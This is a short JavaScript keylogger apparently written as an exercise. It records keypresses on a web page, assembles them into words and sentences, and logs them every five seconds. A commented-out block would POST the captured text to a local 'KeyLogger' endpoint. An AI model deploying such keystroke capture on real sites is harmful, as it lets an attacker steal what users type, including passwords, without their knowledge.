const displayText = document.getElementById('displayText');

function showText(s) {
    displayText.innerHTML = s;
}



var word = '';
var sentence = '';
var text = '';

document.addEventListener('keypress', e => {
    const char = (e.keyCode === 13) ? '\n' : String.fromCharCode(e.keyCode);

    if (char === ' '){
        if (word.length !== 0) {
            showText('Word:\n' + word);
            sentence += word + char;
            word = '';
        }
    }
    // Enter = 13
    else if (char === '.' || char === '\n') {
        sentence += word;

        if (sentence.length !== 0){
            word = '';
            sentence += char;
            showText('Sentence:\n' + sentence);
            text += sentence;
            sentence = '';
        }
    }
    else {
        word += char;
    }
});

setInterval(() => {
    if (text !== ''){
        console.log('Text for Submission:\n' + text);
/*
        var request = new XMLHttpRequest();
        request.open('POST', 'http://localhost:8080/KeyLogger');
        request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        request.send('text=' + text);
*/

        text = '';
    }
}, 5000);
